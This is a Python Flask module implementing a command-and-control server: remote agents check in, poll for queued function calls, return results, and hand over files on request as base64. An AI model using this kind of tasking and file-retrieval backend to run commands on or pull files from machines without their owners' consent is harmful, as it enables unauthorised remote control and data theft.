from flask import request, jsonify
import time, uuid, base64

class Agents(object):
    def __init__(self, app, io, base="https://command.marcusweinberger.repl.co", uri="/agents"):
        self.app = app
        self.io = io
        self.base = base
        self.uri = uri
        self.agents = {}
        self.commands = {}
        self._add_routes()
    
    def _url(self, path):
        return self.base + self.uri + path
    def _add_routes(self):
        self.app.add_url_rule(self.uri + "/ping", "agents_ping", view_func=self.ping)
        self.app.add_url_rule(self.uri + "/commands", "agents_commands", view_func=self.check_commands)
        self.app.add_url_rule(self.uri + "/submit", "agents_result", methods=['POST'], view_func=self.submit)
        self.app.add_url_rule(self.uri + "/result/<uid>", "agents_view_result", view_func=self.view_results)
    
    def ping(self):
        name = request.args['name']
        if not name in self.agents:
            self.io.info("[agents] new agent <%s>" % name)
            self.agents[name] = {}
        self.agents[name]['time'] = time.time()
        return "pong"
    
    def check_commands(self):
        name = request.args['name']
        cmds = {uid:self.commands[uid] for uid in self.commands if name in self.commands[uid]['agents'] or self.commands[uid]['agents'] == "all"}
        return jsonify(cmds)
    
    def submit(self):
        uid = request.form['uid']
        name = request.form['name']
        res = request.form['res']
        if uid in self.commands:
            self.commands[uid]['results'][name] = res
            if self.commands[uid].get("alert"):
                self.io.show("[agents] command result from <%s>" % name, url=self._url("/result/"+uid))
            else:
                self.io.info("[agents] command result from <%s>" % name, url=self._url("/result/"+uid))
            return "ok"
        return "none"
    
    def view_results(self, uid):
        return jsonify(self.commands.get(uid, {}))
    
    def add_cmd(self, agents, fn, args=[], kwargs={}, alert=False):
        uid = str(uuid.uuid4())
        self.commands[uid] = {'agents':agents, 'fn':fn, 'args':args, 'kwargs':kwargs, 'results':{}, 'alert':alert}
        return uid
    
    def cmd_now(self, agents, fn, args=[], kwargs={}):
        uid = str(uuid.uuid4())
        self.commands[uid] = {'agents':agents, 'results':{}, 'fn':fn, 'args':args, 'kwargs':kwargs}
        while not list(self.commands[uid]['results'].keys()) == (agents if not agents == "all" else list(self.agents.keys())):
            pass
        return self.commands[uid]['results']
    
    def download(self, agent, fp):
        return base64.b64decode(self.cmd_now([agent], "download", args=[fp])[agent])